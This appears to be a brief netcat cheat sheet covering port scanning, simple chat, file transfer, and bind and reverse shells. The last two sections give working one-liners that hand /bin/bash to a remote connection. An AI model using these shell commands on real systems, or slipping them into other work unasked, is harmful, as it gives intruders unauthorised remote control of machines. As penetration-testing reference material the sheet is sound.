### Find open ports
```
nc -nv 127.0.0.1 21
nc -nvvz 127.0.0.1 21-25
nc -nvvz -u 127.0.0.1 160-162
for port in {21..25};do timeout 1 nc -nv 127.0.0.1 $port; done
```

### Chat using nc
```
nc -nlvp 4444 # listener
nc -nv 127.0.0.1 4444 # connector
```

### Transferring files
```
nc -nlvp 4444 > wget # listener
nc -nv 192.168.1.4 4444 < /usr/bin/wget # connector
```

### Bind shell
```
nc -nlvp 4444 -e /bin/bash # listener on target
nc -nv 127.0.0.1 4444 # connector
```

### Reverse shell
```
nc -nlvp 4444 # listener on attacker
nc -nv 127.0.0.1 4444 -e /bin/bash # connector
```
